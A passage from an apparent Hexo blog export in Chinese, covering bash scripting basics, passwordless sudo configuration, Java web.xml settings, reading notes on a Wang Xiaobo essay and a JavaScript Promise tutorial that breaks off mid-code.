<h3 id="⑦-until"><a href="#⑦-until" class="headerlink" title="⑦ until"></a>⑦ until</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line">a=0</span><br><span class="line"></span><br><span class="line">until [ ! <span class="variable">$a</span> -lt 10 ]</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">   <span class="built_in">echo</span> <span class="variable">$a</span></span><br><span class="line">   a=`expr <span class="variable">$a</span> + 1`</span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure>

<h2 id="9-函数"><a href="#9-函数" class="headerlink" title="9. 函数"></a>9. 函数</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">funWithParam</span></span>()&#123;</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;第一个参数为 <span class="variable">$1</span> !&quot;</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;第二个参数为 <span class="variable">$2</span> !&quot;</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;第十个参数为 <span class="variable">$10</span> !&quot;</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;第十个参数为 <span class="variable">$&#123;10&#125;</span> !&quot;</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;第十一个参数为 <span class="variable">$&#123;11&#125;</span> !&quot;</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;参数总数有 <span class="variable">$#</span> 个!&quot;</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;作为一个字符串输出所有参数 $* !&quot;</span></span><br><span class="line">&#125;</span><br><span class="line">funWithParam 1 2 3 4 5 6 7 8 9 34 73</span><br></pre></td></tr></table></figure>
<p>结果：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">第一个参数为 1 !</span><br><span class="line">第二个参数为 2 !</span><br><span class="line">第十个参数为 10 !</span><br><span class="line">第十个参数为 34 !</span><br><span class="line">第十一个参数为 73 !</span><br><span class="line">参数总数有 11 个!</span><br><span class="line">作为一个字符串输出所有参数 1 2 3 4 5 6 7 8 9 34 73 !</span><br></pre></td></tr></table></figure>

<h2 id="10-输入输出"><a href="#10-输入输出" class="headerlink" title="10. 输入输出"></a>10. 输入输出</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line">who &gt; today.log <span class="comment"># 执行结果覆盖到文件 today.log</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;菜鸟教程：www.runoob.com&quot;</span> &gt;&gt; today.log <span class="comment"># 执行结果追加到文件 today.log</span></span><br><span class="line">wc -l &lt; today.log <span class="comment"># 统计 today.log 行数</span></span><br><span class="line">wc -l &lt;&lt; <span class="string">EOF</span></span><br><span class="line"><span class="string">    李白</span></span><br><span class="line"><span class="string">    苏轼</span></span><br><span class="line"><span class="string">    王勃</span></span><br><span class="line"><span class="string">EOF</span></span><br></pre></td></tr></table></figure>

<h2 id="11-文件包含"><a href="#11-文件包含" class="headerlink" title="11. 文件包含"></a>11. 文件包含</h2><p>test1.sh</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line">name=<span class="string">&quot;Chris&quot;</span></span><br></pre></td></tr></table></figure>
<p>test2.sh</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="comment">#使用 . 号来引用test1.sh 文件</span></span><br><span class="line">. ./test1.sh</span><br><span class="line"></span><br><span class="line"><span class="comment"># 或者使用以下包含文件代码</span></span><br><span class="line"><span class="comment"># source ./test1.sh</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$name</span></span><br></pre></td></tr></table></figure>
<blockquote>
<p>注：被包含的文件 test1.sh 不需要可执行权限。</p>
</blockquote>
<h2 id="reference"><a href="#reference" class="headerlink" title="reference:"></a>reference:</h2><p>[1] <a href="http://www.runoob.com/linux/linux-shell.html">http://www.runoob.com/linux/linux-shell.html</a></p>
]]></content>
      <categories>
        <category>yelog</category>
        <category>运维</category>
      </categories>
      <tags>
        <tag>linux</tag>
        <tag>shell</tag>
      </tags>
  </entry>
  <entry>
    <title>sudo命令免密码设置</title>
    <url>//sudo%E5%91%BD%E4%BB%A4%E5%85%8D%E5%AF%86%E7%A0%81%E8%AE%BE%E7%BD%AE</url>
    <content><![CDATA[<blockquote>
<p>如果某台linux只有自己在使用，比如个人系统，每次调用 <code>sudo</code> 时都需要输入密码，长期下来着实厌烦，因此本文介绍如何配置 <code>sudo</code> 命令，使其在运行时不需要输入密码。</p>
</blockquote>
<h2 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h2><ol>
<li><p>执行命令</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ sudo visudo</span><br></pre></td></tr></table></figure></li>
<li><p>添加以下两行， 下面的 sys 表示 sys 组成员不用密码使用sudo</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">aaronkilik ALL=(ALL) NOPASSWD: ALL</span><br><span class="line">%sys ALL=(ALL) NOPASSWD: ALL</span><br></pre></td></tr></table></figure></li>
</ol>
<p>现在在使用 <code>sudo</code> 命令， 将不再需要输入密码。</p>
<h2 id="扩展"><a href="#扩展" class="headerlink" title="扩展"></a>扩展</h2><p>如果只允许用户使用 <code>kill</code> 和 <code>rm</code> 命令时，不需要输入密码，见如下配置</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">%sys ALL=(ALL) NOPASSWD: /bin/kill, /bin/rm</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>yelog</category>
        <category>运维</category>
      </categories>
      <tags>
        <tag>linux</tag>
      </tags>
  </entry>
  <entry>
    <title>web.xml详解</title>
    <url>//web-xml</url>
    <content><![CDATA[<p>web.xml文件是用来配置:欢迎页、servlet、filter、listener等的. 当你的web项目工程没用到这些时,你可以不用web.xml文件来配置你的web工程。<br>如果项目中有多项标签,其加载顺序依次是:context-param &gt;&gt; listener &gt;&gt; filter &gt;&gt; servlet(同类多个节点出现顺序依次加载)</p>
<span id="more"></span>
<ol>
<li>web.xml先读取context-param和listener这两种节点；</li>
<li>然后容器创建一个ServletContext(上下文)，应用于整个项目；</li>
<li>容器会将读取到的context-param转化为键值对并存入servletContext；</li>
<li>根据listener创建监听；</li>
<li>容器会读取，根据指定的类路径来实例化过滤器；</li>
<li>此时项目初始化完成；</li>
<li>在发起第一次请求是，servlet节点才会被加载实例化。</li>
</ol>
<h2 id="参数设置"><a href="#参数设置" class="headerlink" title="参数设置"></a>参数设置</h2><h3 id="context-param"><a href="#context-param" class="headerlink" title="context-param"></a>context-param</h3><p>context-param节点是web.xml中用于配置应用于整个web项目的​上下文。包括两个子节点，其中param-name 设定上下文的参数名称。必须是唯一名称；param-value 设定的参数名称的值。</p>
<p>读取节点的方法如下：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">$&#123;initParam.参数名&#125;</span><br></pre></td></tr></table></figure>
<p>Servlet中String paramValue=getServletContext().getInitParameter(“参数名”)​</p>
<p>web.xml中配置spring必须使用listener节点，但context-param节点可有可无，如果缺省则默认contextConfigLocation路径为“/WEB-INF/applicationContext.xml”；如果有多个xml文件，使用”,“分隔</p>
<h3 id="listener"><a href="#listener" class="headerlink" title="listener"></a>listener</h3><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">listener</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">listener-class</span>&gt;</span>org.springframework.web.context.request.RequestContextListener<span class="tag">&lt;/<span class="name">listener-class</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">listener</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>为web应用程序定义监听器，监听器用来监听各种事件，比如：application和session事件，所有的监听器按照相同的方式定义，功能取决去它们各自实现的接口，常用的Web事件接口有如下几个：<br><code>ServletContextListener</code>：用于监听Web应用的启动和关闭；<br><code>ServletContextAttributeListener</code>：用于监听ServletContext范围（application）内属性的改变；<br><code>ServletRequestListener</code>：用于监听用户的请求；<br><code>ServletRequestAttributeListener</code>：用于监听ServletRequest范围（request）内属性的改变；<br><code>HttpSessionListener</code>：用于监听用户session的开始和结束；<br><code>HttpSessionAttributeListener</code>：用于监听HttpSession范围（session）内属性的改变。</p>
<p>配置Listener只要向Web应用注册Listener实现类即可，无序配置参数之类的东西，因为Listener获取的是Web应用ServletContext（application）的配置参数。为Web应用配置Listener的两种方式：</p>
<ol>
<li>使用@WebListener修饰Listener实现类即可。</li>
<li>在web.xml文档中使用进行配置。</li>
</ol>
<h3 id="servlet"><a href="#servlet" class="headerlink" title="servlet"></a>servlet</h3><p>servlet即配置所需用的servlet，用于处理及响应客户的请求。容器的Context对象对请求路径(URL)做出处理，去掉请求URL的上下文路径后，按路径映射规则和Servlet映射路径（）做匹配，如果匹配成功，则调用这个Servlet处理请求。</p>
<h4 id="为Servlet命名："><a href="#为Servlet命名：" class="headerlink" title="为Servlet命名："></a>为Servlet命名：</h4><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">servlet</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>servlet<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">servlet-class</span>&gt;</span>org.whatisjava.TestServlet<span class="tag">&lt;/<span class="name">servlet-class</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">load-on-startup</span>&gt;</span>1<span class="tag">&lt;/<span class="name">load-on-startup</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">servlet</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h4 id="为Servlet定制URL"><a href="#为Servlet定制URL" class="headerlink" title="为Servlet定制URL"></a>为Servlet定制URL</h4><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>servlet<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>*.do<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">servlet-mapping</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h4 id="Load-on-startup"><a href="#Load-on-startup" class="headerlink" title="Load-on-startup"></a>Load-on-startup</h4><p>Load-on-startup 元素在web应用启动的时候指定了servlet被加载的顺序，它的值必须是一个整数。如果它的值是一个负整数或是这个元素不存在，那么容器会在该servlet被调用的时候，加载这个servlet 。如果值是正整数或零，容器在配置的时候就加载并初始化这个servlet，容器必须保证值小的先被加载。如果值相等，容器可以自动选择先加载谁。<br>当值为0或者大于0时，表示容器在应用启动时就加载这个servlet；<br>当是一个负数时或者没有指定时，则指示容器在该servlet被选择时才加载。<br>正数的值越小，启动该servlet的优先级越高。</p>
<h3 id="filter"><a href="#filter" class="headerlink" title="filter"></a>filter</h3><p>设置过滤器:如编码过滤器,过滤所有资源</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">filter</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>encodingFilter<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter-class</span>&gt;</span>org.springframework.web.filter.CharacterEncodingFilter<span class="tag">&lt;/<span class="name">filter-class</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">init-param</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">param-name</span>&gt;</span>encoding<span class="tag">&lt;/<span class="name">param-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">param-value</span>&gt;</span>UTF-8<span class="tag">&lt;/<span class="name">param-value</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">init-param</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">init-param</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">param-name</span>&gt;</span>forceEncoding<span class="tag">&lt;/<span class="name">param-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">param-value</span>&gt;</span>true<span class="tag">&lt;/<span class="name">param-value</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">init-param</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">filter</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">filter-mapping</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>encodingFilter<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/*<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">filter-mapping</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h3 id="session"><a href="#session" class="headerlink" title="session"></a>session</h3><p>设置会话(Session)过期时间,其中时间以分钟为单位,加入设置60分超时:</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">session-config</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">session-timeout</span>&gt;</span>60<span class="tag">&lt;/<span class="name">session-timeout</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">session-config</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h3 id="welcom-file-list"><a href="#welcom-file-list" class="headerlink" title="welcom-file-list"></a>welcom-file-list</h3><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">welcome-file-list</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">welcome-file</span>&gt;</span>index.jsp<span class="tag">&lt;/<span class="name">welcome-file</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">welcome-file</span>&gt;</span>index.html<span class="tag">&lt;/<span class="name">welcome-file</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">welcome-file-list</span>&gt;</span></span><br></pre></td></tr></table></figure>
<blockquote>
<p>PS:指定了两个欢迎页面,显示时按顺序从第一个找起，如果第一个存在，就显示第一个，后面的不起作用。如果第一个不存在，就找第二个，以此类推。如果都没有就404.</p>
</blockquote>
<h4 id="关于欢迎页面："><a href="#关于欢迎页面：" class="headerlink" title="关于欢迎页面："></a>关于欢迎页面：</h4><p>访问一个网站时，默认看到的第一个页面就叫欢迎页，一般情况下是由首页来充当欢迎页的。一般情况下，我们会在web.xml中指定欢迎页。但 web.xml并不是一个Web的必要文件，没有web.xml，网站仍然是可以正常工作的。只不过网站的功能复杂起来后，web.xml的确有非常大用处，所以，默认创建的动态web工程在WEB-INF文件夹下面都有一个web.xml文件。</p>
<h3 id="error-page"><a href="#error-page" class="headerlink" title="error-page"></a>error-page</h3><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 错误码 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">error-page</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">error-code</span>&gt;</span>404<span class="tag">&lt;/<span class="name">error-code</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">location</span>&gt;</span>/error404.jsp<span class="tag">&lt;/<span class="name">location</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">error-page</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 错误类型 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">error-page</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">exception-type</span>&gt;</span>java.lang.Exception<span class="tag">&lt;<span class="name">exception-type</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">location</span>&gt;</span>/exception.jsp<span class="tag">&lt;<span class="name">location</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">error-page</span>&gt;</span></span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>yelog</category>
        <category>后端</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>javaee</tag>
      </tags>
  </entry>
  <entry>
    <title>[记]《知识分子的不幸》-王小波</title>
    <url>//misfortune-intellectual</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>这篇文章发表于1996年第二期《东方》杂志，同样收录于《沉默的大多数》一书中。</p>
<h2 id="所想"><a href="#所想" class="headerlink" title="所想"></a>所想</h2><p>文章一开头就抛出了一个问题：什么是知识分子最害怕的事？想起了高晓松在晓说中提到过这个问题，晓松肯定是看过这篇文章的。</p>
<p>王小波说：“<strong>知识分子最怕活在不理智的年代。”所谓不理智的年代，就是伽利略低头认罪，承认地球不转的年代，也是拉瓦斯上断头台的年代；是茨威格服毒自杀的年代，也是老舍跳太平湖的年代。</strong>“</p>
<p>王小波和他的美国老师谈论了一个问题：”有信仰比无信仰要好。“，由于王小波是经历过文革的，所以王小波一开始是抵触这种思想的，尤其是 <strong>课间祷告 <strong>让王小波想起了文革中的 <strong>早请示</strong>。但老师最终说服了他，“</strong>不管是信神，还是自珍自重，人活在世界上总得有点信念才成。就我个人而言，虽是无神论者，我也有个人操守，从不逾越。</strong>”</p>
<p>国内的学者，只搞学术研究，不搞意识形态，这由不了自己。有朝一日它成了意识形态，你的话就是罪状。言论不自由，不理智，民族狂热，这不就是知识分子最怕的事情吗？</p>
<p>王小波崇拜墨子：其一，他思维缜密，其二，他敢赤裸裸地谈利害。（有了他，我也敢说自己是中华民族的赤诚分子，不怕国学家说我是全盘西化了。）</p>
<p>营造意识形态则是灭绝思想额丰饶。中国的人文知识分子，有种以天下为己任的使命感，总觉得自己该搞出些老百姓当信仰的东西。</p>
<p>国学，这种东西实在厉害。最可怕之处就在于那个“国”字。顶着这个字，谁敢有不同意见？抢到了这个制高点，就可以压制一切不同意见；所以很容易落入思想流氓的手中变成一种凶器。</p>
<p>目前正值 “<strong>中美贸易战</strong>”，各种自媒体为了点击量、关注度。煽动民族狂热情绪，导致民众根本容不得半点不同意见，不讲道理，“盲目爱国“。</p>
<p>认真思索，真诚的明辨是非，有这种态度大概就可算是善良了吧。</p>
<p>人活在世上，自会形成信念，一种学问、一本书，假如不对我的价值观发生变化，就不值得一学，不值得一看。</p>
]]></content>
      <categories>
        <category>yelog</category>
        <category>读书</category>
      </categories>
      <tags>
        <tag>reading</tag>
      </tags>
  </entry>
  <entry>
    <title>一文看懂JavaScript中的Promise</title>
    <url>//know-javascript-promise</url>
    <content><![CDATA[<h2 id="一、Promise-是什么"><a href="#一、Promise-是什么" class="headerlink" title="一、Promise 是什么"></a>一、Promise 是什么</h2><p><code>Promise</code> 是 <code>ES6</code> 提供的原生对象，用来处理异步操作</p>
<p>它有三种状态</p>
<ul>
<li><code>pending</code>: 初始状态，不是成功或失败状态。</li>
<li><code>fulfilled</code>: 意味着操作成功完成。</li>
<li><code>rejected</code>: 意味着操作失败。</li>
</ul>
<h2 id="二、使用"><a href="#二、使用" class="headerlink" title="二、使用"></a>二、使用</h2><h3 id="2-1-创建-Promise"><a href="#2-1-创建-Promise" class="headerlink" title="2.1 创建 Promise"></a>2.1 创建 Promise</h3><p>通过 <code>new Promise</code> 来实例化，支持链式调用</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function">(<span class="params">resolve, reject</span>)=&gt;</span>&#123;</span><br><span class="line">  <span class="comment">// 逻辑</span></span><br><span class="line">&#125;).then(<span class="function">()=&gt;</span>&#123;</span><br><span class="line">  <span class="comment">//当上面&quot;逻辑&quot;中调用 resolve() 时触发此方法</span></span><br><span class="line">&#125;).catch(<span class="function">()=&gt;</span>&#123;</span><br><span class="line">  <span class="comment">//当上面&quot;逻辑&quot;中调用 reject() 时触发此方法</span></span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
<h3 id="2-2-执行顺序"><a href="#2-2-执行顺序" class="headerlink" title="2.2 执行顺序"></a>2.2 执行顺序</h3><p><code>Promise</code>一旦创建就立即执行，并且无法中途取消，执行逻辑和顺序可以从下面的示例中获得</p>
<p>如下，可修改 <code>if</code> 条件来改变异步结果，下面打印开始的数字是执行顺序</p>
<p><a href="https://jsbin.com/cijuwakeha/1/edit?js,console">在线调试此示例 - jsbin</a></p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="built_in">console</span>.log(<span class="string">&#x27;1.开始创建并执行 Promise&#x27;</span>)</span><br><span class="line"><span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function"><span class="keyword">function</span>(<span class="params">resolve, reject</span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">&#x27;2.由于创建会立即执行，所以会立即执行到本行&#x27;</span>)</span><br><span class="line">  <span class="built_in">setTimeout</span>(<span class="function">()=&gt;</span>&#123; <span class="comment">// 模拟异步请求</span></span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&#x27;4. 1s之期已到，开始执行异步操作&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">        <span class="comment">// 一般我们符合预期的结果时调用 resolve()，会在 .then 中继续执行</span></span><br><span class="line">        resolve(<span class="string">&#x27;成功&#x27;</span>)</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// 不符合预期时调用 reject()，会在 .catch 中继续执行</span></span><br><span class="line">        reject(<span class="string">&#x27;不符合预期&#x27;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;, <span class="number">1000</span>)</span><br><span class="line">&#125;).then(<span class="function">(<span class="params">res</span>)=&gt;</span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">&#x27;5.调用了then，接收数据：&#x27;</span> + res)</span><br><span class="line">&#125;).catch(<span class="function">(<span class="params">error</span>)=&gt;</span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">&#x27;5.调用了catch，错误信息：&#x27;</span> + error)</span><br><span class="line">&#125;)</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&#x27;3.本行为同步操作，所以先于 Promise 内的异步操作（setTimeout）&#x27;</span>)</span><br></pre></td></tr></table></figure>
<p>执行结果如下</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot;1.开始创建并执行 Promise&quot;</span></span><br><span class="line"><span class="string">&quot;2.由于创建会立即执行，所以会立即执行到本行&quot;</span></span><br><span class="line"><span class="string">&quot;3.本行为同步操作，所以先于 Promise 内的异步操作（setTimeout）&quot;</span></span><br><span class="line"><span class="string">&quot;4. 1s之期已到，开始执行异步操作&quot;</span></span><br><span class="line"><span class="string">&quot;5.调用了then，接收数据：成功&quot;</span></span><br></pre></td></tr></table></figure>
<h3 id="2-3-用函数封装-Promise"><a href="#2-3-用函数封装-Promise" class="headerlink" title="2.3 用函数封装 Promise"></a>2.3 用函数封装 Promise</h3><p>这是比较常用的方法，如下用 <code>setTimeout</code> 模拟异步请求，封装通用请求函数</p>
<p><a href="https://jsbin.com/figuhohoki/1/edit?js,console">在线调试此示例 - jsbin</a></p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 这是一个异步方法</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">ajax</span>(<span class="params">url</span>)</span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function"><span class="params">resolve</span>=&gt;</span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&#x27;异步方法开始执行&#x27;</span>)</span><br><span class="line">    <span class="built_in">setTimeout</span>(<span class="function">()=&gt;</span>&#123;</span><br><span class="line">      <span class="built_in">console</span>.log(<span class="string">&#x27;异步方法执行完成&#x27;</span>)</span><br><span class="line">      resolve(url+<span class="string">&#x27;的结果集&#x27;</span>)</span><br><span class="line">    &#125;, <span class="number">1000</span>)</span><br><span class="line">  &#125;)</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 调用请求函数，并接受处理返回结果</span></span><br><span class="line">ajax(<span class="string">&#x27;/user/list&#x27;</span>).then(<span class="function">(<span class="params">res</span>)=&gt;</span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(res)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
<p>执行结果</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot;异步方法开始执行&quot;</span></span><br><span class="line"><span class="string">&quot;异步方法执行完成&quot;</span></span><br><span class="line"><span class="string">&quot;/user/list的结果集&quot;</span></span><br></pre></td></tr></table></figure>


<h2 id="三、高级用法"><a href="#三、高级用法" class="headerlink" title="三、高级用法"></a>三、高级用法</h2><h3 id="3-1-同时支持Callback与Promise"><a href="#3-1-同时支持Callback与Promise" class="headerlink" title="3.1 同时支持Callback与Promise"></a>3.1 同时支持Callback与Promise</h3><p><a href="https://jsbin.com/qitewirina/1/edit?js,console">在线调试此示例 - jsbin</a></p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">ajax</span>(<span class="params">url, success, fail</span>) </span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (<span class="keyword">typeof</span> success === <span class="string">&#x27;function&#x27;</span>) &#123;</span><br><span class="line">    <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">      <span class="keyword">if</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">        success(&#123;<span class="attr">user</span>: <span class="string">&#x27;羊&#x27;</span>&#125;)</span><br><span class="line">      &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="keyword">typeof</span> fail === <span class="string">&#x27;function&#x27;</span>) &#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="keyword">typeof</span> fail)</span><br><span class="line">        fail(<span class="string">&#x27;用户不存在&#x27;</span>)</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;, <span class="number">1000</span>)</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class="line">      <span class="built_in">this</span>.ajax(url, resolve, reject)</span><br><span class="line">    &#125;)</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// callback 调用方式</span></span><br><span class="line">ajax(<span class="string">&#x27;/user/get&#x27;</span>, <span class="function">(<span class="params">res</span>)=&gt;</span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">&#x27;Callback请求成功！返回结果:&#x27;</span>, res)</span><br><span class="line">&#125;, <span class="function">(<span class="params">error</span>)=&gt;</span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">&#x27;Callback请求失败！错误信息:&#x27;</span>, error)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">// Promise 调用方式</span></span><br><span class="line">ajax(<span class="string">&#x27;/user/get&#x27;</span>).then(<span class="function">(<span class="params">res</span>)=&gt;</span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">&#x27;Pormise请求成功！返回结果：&#x27;</span>, res)</span><br><span class="line">&#125;).catch(<span class="function">(<span class="params">error</span>)=&gt;</span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">&#x27;Promise请求失败！返回结果：&#x27;</span>, error)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
<p>执行结果</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">Callback请求成功！返回结果: &#123;<span class="attr">user</span>: <span class="string">&quot;羊&quot;</span>&#125;</span><br><span class="line">Pormise请求成功！返回结果： &#123;<span class="attr">user</span>: <span class="string">&quot;羊&quot;</span>&#125;</span><br></pre></td></tr></table></figure>

<h3 id="3-2-链式调用"><a href="#3-2-链式调用" class="headerlink" title="3.2 链式调用"></a>3.2 链式调用</h3><p><code>.then</code> 支持返回 <code>Promise</code> 对象进行链式调用</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">ajax(<span class="string">&#x27;/user/info&#x27;</span>).then(<span class="function">(<span class="params">res</span>)=&gt;</span>&#123;</span><br><span class="line">  <span class="comment">// 用户信息查询成功后，可以根据返回结果查询后续信息</span></span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">&#x27;用户信息:&#x27;</span>, res)</span><br><span class="line">  <span class="keyword">return</span> ajax(<span class="string">&#x27;/user/score&#x27;</span>)</span><br><span class="line">&#125;).then(<span class="function">(<span class="params">res</span>)=&gt;</span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">&#x27;用户成绩:&#x27;</span>, res)</span><br><span class="line">  <span class="keyword">return</span> ajax(<span class="string">&#x27;/user/friends&#x27;</span>)</span><br><span class="line">&#125;).then(<span class="function">(<span class="params">res</span>)=&gt;</span>&#123;</span><br><span class="line">  <span 